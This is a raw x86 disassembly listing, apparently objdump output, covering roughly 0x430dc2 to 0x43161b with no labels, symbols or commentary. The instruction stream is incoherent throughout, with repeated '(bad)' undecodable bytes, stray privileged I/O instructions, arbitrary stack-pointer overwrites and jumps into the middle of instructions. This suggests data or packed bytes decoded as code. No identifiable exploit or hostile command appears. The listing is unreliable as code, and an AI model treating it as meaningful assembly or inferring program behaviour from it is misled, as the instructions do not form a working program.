  430dc2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430dc6:	jge    0x430db0
  430dc8:	add    al,0x1
  430dca:	add    DWORD PTR [eax],0x0
  430dcd:	jne    0x430dcf
  430dcf:	je     0x430e16
  430dd1:	mov    eax,DWORD PTR [edi]
  430dd3:	ror    BYTE PTR [ebp+0x4d],1
  430dd6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ddd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430de3:	mov    DWORD PTR [ebx],ebp
  430de5:	fadd   DWORD PTR [eax+0x75]
  430de8:	inc    eax
  430de9:	pop    eax
  430dea:	lea    ebx,[ecx+0x4f]
  430ded:	push   0xb1000003
  430df2:	out    dx,eax
  430df3:	add    ebp,DWORD PTR [edx+edx*2]
  430df6:	add    BYTE PTR [ebx+ecx*4],bh
  430df9:	mov    ch,BYTE PTR [ebx]
  430dfb:	jb     0x430e6f
  430dfd:	add    al,0x89
  430dff:	push   eax
  430e00:	call   0x842b5b72
  430e05:	add    DWORD PTR [eax+eax*1],eax
  430e08:	jae    0x430e1e
  430e0a:	icebp  
  430e0b:	inc    ebp
  430e0c:	mov    eax,DWORD PTR gs:[ecx]
  430e0f:	int3   
  430e10:	out    dx,al
  430e11:	loopne 0x430e60
  430e13:	sub    eax,DWORD PTR [edx]
  430e15:	push   0xffffff83
  430e17:	pop    esi
  430e18:	push   cs
  430e19:	jl     0x430e34
  430e1b:	add    al,0xaf
  430e1d:	xor    eax,0x832b6d00
  430e22:	mov    eax,DWORD PTR [edx]
  430e24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430e2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430e30:	inc    ebp
  430e31:	shr    ebx,0x3
  430e34:	or     DWORD PTR [eax],0x4
  430e37:	push   0xffffffa5
  430e39:	pop    esi
  430e3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430e41:	jmp    0x430ea0
  430e43:	mov    edi,0xff0272
  430e48:	fdivr  QWORD PTR [ebp+0x5d]
  430e4b:	push   0x4e
  430e4d:	pop    ecx
  430e4e:	call   0x435253
  430e53:	mov    DWORD PTR [ebx],eax
  430e55:	in     al,0xc8
  430e57:	rol    BYTE PTR [ebp-0x75],0xc1
  430e5b:	call   0xad103c
  430e60:	pop    esi
  430e61:	enter  0xceff,0x8b
  430e65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430e69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430e70:	je     0x430e72
  430e72:	or     DWORD PTR [ebx-0x74183b24],eax
  430e78:	jne    0x430e5e
  430e7a:	jmp    0x430e75
  430e7c:	push   DWORD PTR [edx-0x24]
  430e7f:	push   0x4d
  430e81:	pop    ecx
  430e82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430e86:	jge    0x430e8e
  430e88:	mov    eax,eax
  430e8a:	sub    ebp,DWORD PTR [edx+0x24]
  430e8d:	pop    esi
  430e8e:	inc    ebp
  430e8f:	mov    esp,0x8b6077
  430e94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430e9a:	lods   al,BYTE PTR ds:[esi]
  430e9b:	add    BYTE PTR [ebx],bh
  430e9d:	enter  0xce73,0x49
  430ea1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430ea9:	stc    
  430eaa:	jge    0x430f1e
  430eac:	jnp    0xdd42921b
  430eb2:	call   0xc60f88
  430eb7:	fadd   st(0),st
  430eb9:	dec    esi
  430eba:	ins    BYTE PTR es:[edi],dx
  430ebb:	stc    
  430ebc:	cmp    al,0x73
  430ebe:	push   ebp
  430ebf:	mov    eax,0xf8028b
  430ec4:	jne    0x430e87
  430ec6:	mov    esi,ecx
  430ec8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ecb:	add    edi,DWORD PTR [ebp-0x24]
  430ece:	sub    esp,eax
  430ed0:	and    al,0x45
  430ed2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430ed8:	sbb    al,0xee
  430eda:	pop    esi
  430edb:	call   0x830f0b
  430ee0:	fsubr  st,st(3)
  430ee2:	sti    
  430ee3:	add    BYTE PTR gs:[ecx],bh
  430ee6:	add    eax,esp
  430ee8:	add    DWORD PTR [esi],eax
  430eea:	rol    DWORD PTR [ebp+0x8],0x29
  430eee:	mov    esp,eax
  430ef0:	clc    
  430ef1:	jne    0x430f68
  430ef3:	mov    eax,0x8b0673
  430ef8:	loopne 0x430f3f
  430efa:	loopne 0x430e85
  430efc:	lods   al,BYTE PTR ds:[esi]
  430efd:	int3   
  430efe:	inc    ebp
  430eff:	mov    DWORD PTR gs:[eax+edi*8],eax
  430f03:	add    al,0xc3
  430f05:	sub    ecx,DWORD PTR [ebp+0x47]
  430f08:	(bad)  
  430f0a:	shr    BYTE PTR [ebp-0x1f],0xe8
  430f0e:	add    eax,DWORD PTR [eax]
  430f10:	call   0x644d015
  430f15:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430f1b:	dec    esi
  430f1c:	ins    DWORD PTR es:[edi],dx
  430f1d:	in     al,dx
  430f1e:	lea    eax,[eax]
  430f20:	inc    ebp
  430f21:	inc    ebp
  430f22:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430f28:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430f32:	and    al,0xdc
  430f34:	ror    DWORD PTR [edx+0x24],0xf7
  430f38:	or     BYTE PTR [ebp+0x4c],dh
  430f3b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430f3f:	stos   BYTE PTR es:[edi],al
  430f40:	adc    edx,edi
  430f42:	inc    esp
  430f43:	add    edi,DWORD PTR [eax]
  430f45:	jne    0x430f2a
  430f47:	mov    DWORD PTR [eax-0x7449db04],ecx
  430f4d:	cmp    ecx,DWORD PTR [edi]
  430f4f:	sub    BYTE PTR [ebp-0x7e],dl
  430f52:	sar    ebp,0xb
  430f55:	jmp    FWORD PTR [edi+0x2400392a]
  430f5b:	sub    esi,DWORD PTR [ebx-0x73]
  430f5e:	mov    esp,DWORD PTR [ecx+edi*4]
  430f61:	mov    ecx,DWORD PTR [eax]
  430f63:	and    BYTE PTR [eax],al
  430f65:	jne    0x430f31
  430f67:	sub    ebp,ecx
  430f69:	sbb    BYTE PTR [esi+0x32],ah
  430f6c:	dec    ebp
  430f6d:	push   ebp
  430f6e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  430f74:	ret    
  430f75:	mov    edx,ebp
  430f77:	leave  
  430f78:	sub    DWORD PTR [esi+0x24],ebx
  430f7b:	ret    0x2b
  430f7e:	pop    ax
  430f80:	push   ebp
  430f81:	rol    BYTE PTR [ebx],0xeb
  430f84:	add    DWORD PTR [ecx+0x6c0001],0x40
  430f8b:	jb     0x430fe2
  430f8d:	ret    
  430f8e:	in     al,dx
  430f8f:	jecxz  0x430f1c
  430f91:	push   esi
  430f92:	xchg   esp,eax
  430f93:	jne    0x430f95
  430f95:	cmp    edx,DWORD PTR [esi+0x1c]
  430f98:	jne    0x430f7e
  430f9a:	mov    eax,DWORD PTR [ebp-0x77]
  430f9d:	ror    DWORD PTR [ebx+0x899408],0xe0
  430fa4:	mov    esi,DWORD PTR [ebp-0x75]
  430fa7:	pop    esi
  430fa8:	nop
  430fa9:	mov    eax,DWORD PTR [eax]
  430fab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  430fb1:	add    al,0x0
  430fb3:	inc    ebp
  430fb4:	mov    eax,DWORD PTR [ebx]
  430fb6:	mov    ebp,ebx
  430fb8:	cmp    al,0xf
  430fba:	or     al,al
  430fbc:	inc    ebp
  430fbd:	inc    ebp
  430fbe:	xor    eax,0x8bc89c8b
  430fc3:	ins    BYTE PTR es:[edi],dx
  430fc4:	cld    
  430fc5:	add    BYTE PTR [edi+0x536c16c0],dh
  430fcb:	add    BYTE PTR [ecx-0x5],dl
  430fce:	add    eax,0x17200
  430fd3:	sbb    al,0x85
  430fd5:	dec    esp
  430fd6:	je     0x431010
  430fd8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  430fdc:	add    BYTE PTR [ebx],bh
  430fde:	(bad)  
  430fdf:	and    al,0x34
  430fe1:	jae    0x430f7f
  430fe3:	mov    cl,cl
  430fe5:	inc    DWORD PTR [esp]
  430fe8:	push   ebp
  430fe9:	shr    esp,0x8
  430fec:	in     al,dx
  430fed:	push   esp
  430fee:	add    DWORD PTR [eax],esp
  430ff0:	add    bl,cl
  430ff2:	inc    ebp
  430ff3:	mov    bh,0x89
  430ff5:	add    ah,bh
  430ff7:	jmp    0xca771f41
  430ffc:	pushf  
  430ffd:	dec    esp
  430ffe:	push   ebx
  430fff:	and    BYTE PTR [ebp+0x17],al
  431002:	xor    eax,0x56009cd9
  431007:	add    BYTE PTR [ebp+0x2b],al
  43100a:	in     eax,0xc1
  43100c:	inc    ebp
  43100d:	add    eax,0xc601d8
  431012:	mov    al,0xc6
  431015:	ins    BYTE PTR es:[edi],dx
  431016:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43101d:	dec    esp
  43101e:	xor    esp,DWORD PTR [eax]
  431020:	(bad)  
  431021:	fxch   st(1)
  431023:	sub    DWORD PTR [ebx],esi
  431025:	add    BYTE PTR [edx-0x40],bl
  431028:	mov    eax,0x248d8d00
  43102e:	xor    eax,0x188b0fc3
  431033:	push   ecx
  431034:	fimul  DWORD PTR [edx+0x8801d9]
  43103a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431041:	xor    ebx,ebp
  431043:	mov    al,BYTE PTR [ebp+0x1]
  431046:	jmp    0xdb4c554b
  43104b:	mov    dl,0x45
  43104d:	add    esi,ebp
  43104f:	add    BYTE PTR [ebp+0xe],al
  431052:	sub    DWORD PTR [edx+0x2e0145],eax
  431058:	inc    ebp
  431059:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43105d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431061:	cld    
  431062:	mov    dh,0xa5
  431064:	xor    edi,eax
  431066:	add    eax,DWORD PTR [ebp+0x46]
  431069:	prefetcht0 BYTE PTR [ecx-0x2]
  43106d:	xor    eax,0x7c60872
  431072:	mov    esp,0xbd32c69a
  431077:	pop    esi
  431078:	mov    cl,0xbe
  43107b:	or     al,0xc6
  43107d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431084:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43108b:	add    dh,al
  43108d:	mov    eax,ebx
  43108f:	xor    DWORD PTR [ebx],0x35008dbc
  431095:	mov    ecx,DWORD PTR [edi]
  431097:	sbb    al,0x18
  431099:	inc    ebp
  43109a:	fcmovb st,st(7)
  43109c:	fxtract 
  43109e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4310a4:	in     eax,dx
  4310a5:	call   0xf942962f
  4310aa:	inc    esi
  4310ac:	inc    ebp
  4310ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4310b3:	push   edi
  4310b4:	adc    eax,DWORD PTR [ebp-0x77]
  4310b7:	out    0x8b,eax
  4310b9:	inc    ebp
  4310ba:	cmp    BYTE PTR [ecx],ch
  4310bc:	inc    DWORD PTR [ebp+0x3b]
  4310bf:	inc    ebp
  4310c0:	jne    0x4310f0
  4310c2:	(bad)  
  4310c3:	(bad)  
  4310c4:	mov    eax,0xf87c8545
  4310c9:	test   BYTE PTR [ebp-0x47],0xea
  4310cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4310d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4310db:	inc    esi
  4310dc:	test   DWORD PTR [eax],ebx
  4310de:	add    bh,dh
  4310e0:	add    BYTE PTR [edx+0x45],dh
  4310e3:	(bad)  
  4310e4:	mov    ebx,esp
  4310e6:	jl     0x4310ae
  4310e8:	add    ch,bl
  4310ea:	mov    esi,eax
  4310ec:	mov    ebx,esi
  4310ee:	cld    
  4310ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4310f6:	cmp    dh,al
  4310f8:	imul   esp,ecx,0xe28dc600
  4310fe:	shl    DWORD PTR [ebx],1
  431100:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431106:	mov    ebx,DWORD PTR [eax]
  431108:	data16 fiadd DWORD PTR [ebp-0x770027]
  43110f:	add    eax,0x7
  431112:	in     ax,dx
  431114:	test   DWORD PTR [ebp-0x1],eax
  431117:	jmp    0xe48a571b
  43111c:	inc    bp
  43111e:	test   eax,esp
  431120:	inc    DWORD PTR [ebp-0x1]
  431123:	cmc    
  431124:	rol    BYTE PTR [ebp+0x66],0xdf
  431128:	test   DWORD PTR [ebp-0x1],eax
  43112b:	in     al,dx
  43112c:	inc    DWORD PTR [ebp+0x47]
  43112f:	out    0x66,eax
  431131:	inc    ebp
  431132:	test   DWORD PTR [edi+edi*8-0xa],edi
  431136:	inc    DWORD PTR [eax+eax*8-0x44]
  43113a:	data16 mov dh,0x85
  43113d:	xor    edi,edi
  43113f:	add    edi,edi
  431141:	inc    esi
  431142:	inc    edi
  431143:	sbb    BYTE PTR [esi-0x2],ah
  431146:	test   DWORD PTR [edx-0x1],esi
  431149:	(bad)  
  43114a:	(bad)  
  43114b:	cmp    bh,al
  43114d:	dec    DWORD PTR [ecx-0x278b77]
  431153:	dec    ebp
  431154:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43115b:	add    edi,edi
  43115d:	lea    edi,[eax+0xff99ff]
  431163:	enter  0xe89,0x78
  431167:	inc    ebp
  431168:	push   DWORD PTR ds:0xc7829cb8
  43116e:	add    BYTE PTR [eax-0x7857a77],bh
  431174:	inc    DWORD PTR [ebp-0x48]
  431177:	mov    edx,edi
  431179:	mov    WORD PTR [eax],es
  43117b:	add    BYTE PTR [ecx-0xf083c7],cl
  431181:	pop    edi
  431182:	add    DWORD PTR [eax],0xffffffe4
  431185:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43118b:	add    DWORD PTR [eax+0x382700],edi
  431191:	inc    ebp
  431192:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431198:	add    BYTE PTR [ecx+0x4f45b866],cl
  43119e:	lea    eax,[eax]
  4311a0:	add    eax,0x89660878
  4311a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4311ac:	loopne 0x431137
  4311ae:	(bad)  
  4311af:	data16 aam 0xff
  4311b2:	in     al,dx
  4311b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4311b8:	pop    ecx
  4311b9:	push   0x8ddaff18
  4311be:	jmp    0x4311bf
  4311c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4311c6:	lea    eax,[ebx-0x767aee30]
  4311cc:	(bad)  
  4311cd:	ins    BYTE PTR es:[edi],dx
  4311ce:	(bad)  
  4311cf:	inc    DWORD PTR [ebp-0xfb0173]
  4311d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4311db:	adc    DWORD PTR [ecx+0x3d],0x33
  4311df:	mov    DWORD PTR [ebx+0xff7270],edi
  4311e5:	(bad)  
  4311e6:	ret    
  4311e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4311ed:	call   DWORD PTR [eax-0x75]
  4311f0:	inc    ebp
  4311f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4311f8:	mov    eax,0x85ff66b0
  4311fe:	add    edi,edi
  431200:	add    bh,bh
  431202:	(bad)  
  431203:	stc    
  431204:	inc    DWORD PTR [eax]
  431206:	or     BYTE PTR [esi+0x45],ah
  431209:	test   DWORD PTR [ebp-0x7e008a01],eax
  43120f:	outs   dx,BYTE PTR ds:[esi]
  431210:	pop    DWORD PTR [eax]
  431212:	adc    ah,BYTE PTR [esi-0x78]
  431215:	test   DWORD PTR [eax-0x1],esi
  431218:	mov    ecx,0x6b4fff
  43121d:	add    cl,al
  43121f:	mov    WORD PTR [ebp-0x3f0078],ax
  431226:	mov    eax,eax
  431228:	data16 push bp
  43122b:	test   DWORD PTR [ebp-0x76000201],ecx
  431231:	dec    esp
  431232:	mov    WORD PTR [eax],es
  431234:	ret    0x6666
  431237:	inc    ebp
  431238:	push   ebp
  431239:	mov    eax,0xf3478d
  43123e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431244:	pushw  0x55
  431247:	lea    ax,[ebp-0x1f]
  43124b:	(bad)  
  43124c:	mov    eax,edx
  43124e:	xchg   esp,eax
  43124f:	in     al,0x89
  431251:	cmc    
  431252:	xchg   esi,eax
  431253:	inc    ebp
  431254:	iret   
  431255:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43125b:	ror    BYTE PTR [ebx+0x5532668a],1
  431261:	or     BYTE PTR [ebx+0x55186639],0x49
  431268:	(bad)  
  431269:	repz cmp eax,0xa0898945
  43126f:	mov    ah,0x89
  431271:	jmp    DWORD PTR [edx+0x66b0418d]
  431277:	inc    DWORD PTR [ebp+0x50]
  43127a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43127e:	mov    DWORD PTR [eax],ecx
  431280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431281:	pop    es
  431282:	inc    ecx
  431283:	(bad)  
  431284:	call   0x366:0x3245
  43128a:	dec    ebp
  43128b:	push   eax
  43128c:	inc    bp
  43128e:	jge    0x431213
  431290:	mov    esp,DWORD PTR [esi-0x18]
  431293:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431299:	add    DWORD PTR [ebx],esi
  43129b:	add    BYTE PTR [ebx],al
  43129d:	test   DWORD PTR [ebx],esi
  43129f:	(bad)  
  4312a0:	inc    WORD PTR [ebp+0x0]
  4312a4:	mov    eax,DWORD PTR [eax]
  4312a6:	call   0x8898c9db
  4312ab:	mov    esi,eax
  4312ad:	clc    
  4312ae:	ret    
  4312af:	rol    cl,0xa
  4312b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4312b8:	mov    edx,edi
  4312ba:	pushf  
  4312bb:	pop    es
  4312bc:	jmp    DWORD PTR [edx+0x66]
  4312bf:	add    BYTE PTR [ebp-0x990175],al
  4312c5:	inc    ebp
  4312c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4312cc:	push   ebp
  4312cd:	mov    edi,eax
  4312cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4312d5:	push   ebp
  4312d6:	add    BYTE PTR [ebx-0x764b0777],al
  4312dc:	dec    DWORD PTR [esi+0x661851e8]
  4312e2:	add    BYTE PTR [ebp-0x7b],dl
  4312e5:	cmp    esi,0xfffffff3
  4312e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4312ee:	jmp    DWORD PTR [esi-0x75]
  4312f1:	push   ebp
  4312f2:	hlt    
  4312f3:	data16 (bad) 
  4312f5:	dec    ebp
  4312f6:	ret    
  4312f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4312fd:	lea    edx,[eax-0x1]
  431300:	jne    0x4312d3
  431302:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431308:	dec    BYTE PTR [ecx+0x51559eff]
  43130e:	mov    DWORD PTR [esi-0x4c],esp
  431311:	push   ebp
  431312:	jmp    DWORD PTR [esi-0x18]
  431315:	inc    ebp
  431316:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43131c:	(bad)  
  43131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43131e:	inc    eax
  431320:	test   DWORD PTR [esi-0x2],esp
  431323:	inc    ebp
  431324:	dec    DWORD PTR [ebp-0x760bde75]
  43132a:	(bad)  
  43132b:	test   al,0xc3
  43132d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431333:	lods   al,BYTE PTR ds:[esi]
  431334:	push   eax
  431335:	inc    ebp
  431336:	jne    0x431347
  431338:	dec    DWORD PTR [ebp+0x8]
  43133b:	mov    eax,DWORD PTR [ebx]
  43133d:	sbb    al,0x0
  43133f:	(bad)  
  431340:	mov    eax,0xc14fc3
  431345:	mov    DWORD PTR [eax-0x64],edi
  431348:	inc    bp
  43134a:	test   DWORD PTR [edi],ecx
  43134c:	dec    DWORD PTR [ebp-0x1]
  43134f:	xor    eax,edi
  431351:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431357:	inc    ebp
  431358:	xor    DWORD PTR [ebx],0x3f
  43135b:	mov    WORD PTR [ebp-0x1bc],ax
  431362:	lea    ecx,[ecx-0x767702]
  431368:	inc    esi
  431369:	(bad)  
  43136a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431371:	pushf  
  431372:	rol    DWORD PTR [ebp-0x72019a],0xff
  431379:	add    bh,bh
  43137b:	add    BYTE PTR [edi],cl
  43137d:	test   DWORD PTR [eax],eax
  43137f:	(bad)  
  431380:	dec    WORD PTR [ebp-0xff0031]
  431387:	mov    DWORD PTR [ecx-0xb748],ecx
  43138d:	lea    eax,[ebx+0x7cffc1b0]
  431393:	push   eax
  431394:	add    BYTE PTR [ebp+0x66],al
  431397:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43139d:	test   eax,esi
  43139f:	(bad)  
  4313a0:	fdiv   st(7),st
  4313a2:	add    bh,bh
  4313a4:	data16 clc 
  4313a6:	lea    edx,[ebp-0x1]
  4313a9:	(bad)  
  4313aa:	dec    DWORD PTR [eax-0x72b50077]
  4313b0:	dec    DWORD PTR [eax-0x1237a73]
  4313b6:	(bad)  
  4313b7:	(bad)  
  4313b8:	(bad)  
  4313b9:	cdq    
  4313ba:	inc    DWORD PTR [eax]
  4313bc:	ja     0x431347
  4313be:	lea    edi,[eax-0x72000050]
  4313c4:	push   ecx
  4313c5:	mov    al,0x4d
  4313c7:	jmp    DWORD PTR [esi+0x50]
  4313ca:	mov    ch,0x45
  4313cc:	push   DWORD PTR [ebx]
  4313ce:	inc    DWORD PTR [ebx]
  4313d0:	push   ebx
  4313d1:	push   eax
  4313d2:	push   ecx
  4313d3:	test   DWORD PTR [ebx],esi
  4313d5:	(bad)  
  4313d6:	mov    ebx,0xff72ff
  4313db:	clc    
  4313dc:	retf   
  4313dd:	push   ebp
  4313de:	(bad)  
  4313df:	jmp    0x1421524
  4313e4:	push   ecx
  4313e5:	jae    0x4313a7
  4313e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4313ed:	mov    DWORD PTR [ecx+0x40],edx
  4313f0:	(bad)  
  4313f1:	(bad)  
  4313f2:	cld    
  4313f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4313f9:	inc    DWORD PTR [ebp-0x3f0101]
  4313ff:	inc    bp
  431401:	test   DWORD PTR [ebx+0xff98ff],ecx
  431407:	inc    edi
  431408:	(bad)  
  431409:	dec    si
  43140b:	test   edi,edi
  43140d:	(bad)  
  43140e:	cmp    eax,0xc74f7bff
  431413:	mov    edx,DWORD PTR [edx-0x7d]
  431416:	(bad)  
  431417:	mov    ebx,0x563a8931
  43141c:	(bad)  
  43141d:	call   FWORD PTR [esi-0x47]
  431420:	inc    DWORD PTR ds:0x893c00e2
  431426:	mov    DWORD PTR [eax-0x4c],ebx
  431429:	(bad)  
  43142a:	jmp    DWORD PTR [esi-0x1]
  43142d:	test   edi,edi
  43142f:	dec    DWORD PTR [eax]
  431431:	(bad)  
  431432:	inc    eax
  431434:	or     BYTE PTR [ecx+0x8b5745],bh
  43143a:	sbb    al,0x89
  43143c:	rcr    BYTE PTR [edx-0x7c],0xff
  431440:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431446:	add    BYTE PTR [eax],al
  431448:	inc    ebp
  431449:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43144f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431456:	inc    ebp
  431457:	dec    ebp
  431458:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43145e:	lock lea eax,[ebp+0x458df81c]
  431465:	(bad)  
  431466:	xor    eax,0x8b8b9fff
  43146b:	hlt    
  43146c:	cld    
  43146d:	mov    DWORD PTR [eax+0xff014c],eax
  431473:	mov    esi,0x78b0845
  431478:	cld    
  431479:	into   
  43147a:	dec    ebp
  43147b:	call   0x5100:0x38c328b
  431482:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431488:	add    BYTE PTR [ebx],dh
  43148a:	mov    DWORD PTR [eax-0x1c],eax
  43148d:	lea    edi,[ebp-0x2]
  431490:	test   edi,edi
  431492:	jne    0x4314e4
  431494:	push   DWORD PTR [ebp+0x18]
  431497:	mov    DWORD PTR [ebp+0x44],edx
  43149a:	call   0xffcd0f9e
  43149f:	mov    al,0x45
  4314a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4314a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4314ab:	add    BYTE PTR [ebp-0x7b],al
  4314ae:	test   edi,edi
  4314b0:	je     0x4314b1
  4314b2:	dec    DWORD PTR [edi-0x4]
  4314b5:	dec    edi
  4314b6:	or     al,BYTE PTR [ebp-0x740001]
  4314bc:	cld    
  4314bd:	dec    edi
  4314be:	or     BYTE PTR [edi+0x1],0x85
  4314c2:	add    bh,bh
  4314c4:	add    bh,bh
  4314c6:	(bad)  
  4314c7:	icebp  
  4314c8:	ret    
  4314c9:	dec    edi
  4314ca:	inc    ebp
  4314cb:	xchg   ebp,eax
  4314cc:	jne    0x4314cc
  4314ce:	mov    edi,edi
  4314d0:	cld    
  4314d1:	xor    BYTE PTR [ecx+0x500155],cl
  4314d7:	push   ebp
  4314d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4314de:	add    BYTE PTR [ebp+0x35e90f50],al
  4314e4:	add    al,BYTE PTR [eax]
  4314e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4314ec:	add    ah,ch
  4314ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4314f4:	jmp    0xdf17ee
  4314f9:	(bad)  
  4314fa:	nop    ecx
  4314fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431503:	cmp    ecx,DWORD PTR [ebp-0x64]
  431506:	mov    eax,edi
  431508:	mov    ebx,DWORD PTR [eax+edx*2]
  43150b:	add    eax,0x45fef885
  431510:	dec    DWORD PTR [ebx+0x339445]
  431516:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43151c:	dec    DWORD PTR [ebx-0x460f0375]
  431522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431523:	add    esi,edi
  431525:	add    bh,bh
  431527:	rdpmc  
  431529:	add    BYTE PTR [ebx],0x1
  43152c:	mov    DWORD PTR [eax],eax
  43152e:	add    al,0x45
  431530:	dec    DWORD PTR [ecx-0x360b3373]
  431536:	dec    DWORD PTR [esi]
  431538:	push   eax
  431539:	jne    0x431580
  43153b:	mov    esi,DWORD PTR [ebx]
  43153d:	cld    
  43153e:	add    ebp,ebp
  431540:	push   eax
  431541:	inc    DWORD PTR [ebp-0x75]
  431544:	add    eax,0x800e4
  431549:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43154f:	mov    DWORD PTR [ecx],eax
  431551:	sbb    al,0x0
  431553:	leave  
  431554:	test   DWORD PTR [edi-0x2],eax
  431557:	jne    0x431558
  431559:	call   0xff44005e
  43155e:	xor    BYTE PTR [ebp+0x4d],al
  431561:	mov    edi,edi
  431563:	enter  0x8,0x4d
  431567:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43156d:	mov    eax,DWORD PTR [eax]
  43156f:	cld    
  431570:	add    DWORD PTR [ecx],ebx
  431572:	inc    ebp
  431573:	dec    ebp
  431574:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43157a:	inc    eax
  43157b:	dec    DWORD PTR [ecx-0x270375]
  431581:	add    BYTE PTR [ebx-0x39d72701],cl
  431587:	xchg   ecx,eax
  431588:	ret    
  431589:	add    BYTE PTR [ebp-0x830075],al
  43158f:	add    BYTE PTR [ebp-0x75],al
  431592:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431598:	lea    edi,[edi-0xc]
  43159b:	add    bh,bh
  43159d:	mov    edx,DWORD PTR [eax-0x7b]
  4315a0:	inc    ebp
  4315a1:	rdpmc  
  4315a3:	jne    0x4315a8
  4315a5:	add    BYTE PTR [eax-0x75],dl
  4315a8:	inc    ebp
  4315a9:	clc    
  4315aa:	add    eax,0x400009
  4315af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4315b5:	mov    eax,DWORD PTR [ecx]
  4315b7:	in     al,dx
  4315b8:	add    dh,al
  4315ba:	test   ebx,eax
  4315bc:	inc    BYTE PTR [ebp-0xff0001]
  4315c2:	add    BYTE PTR [ebp-0x43],al
  4315c5:	cmp    esi,0xfffffff8
  4315c8:	(bad)  
  4315c9:	push   DWORD PTR [eax]
  4315cb:	add    BYTE PTR [ebp-0x3a],dl
  4315ce:	test   ebx,eax
  4315d0:	je     0x431557
  4315d2:	mov    edi,edi
  4315d4:	sbb    al,0xff
  4315d6:	test   DWORD PTR gs:[eax],eax
  4315d9:	(bad)  
  4315da:	js     0x4315db
  4315dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4315e2:	sub    eax,ebx
  4315e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4315ea:	add    eax,DWORD PTR [eax]
  4315ec:	dec    ebp
  4315ed:	push   eax
  4315ee:	mov    al,BYTE PTR [ebp+0x1]
  4315f1:	mov    eax,DWORD PTR [ebp-0x68]
  4315f4:	mov    eax,DWORD PTR [eax]
  4315f6:	sbb    bh,al
  4315f8:	or     ah,dh
  4315fa:	dec    ebp
  4315fb:	inc    DWORD PTR [eax+0x4]
  4315fe:	push   ecx
  4315ff:	add    BYTE PTR [edx-0x1],dh
  431602:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431608:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431612:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431618:	push   ecx
  431619:	cmp    BYTE PTR [ebx],al
  43161b:	inc    ebp
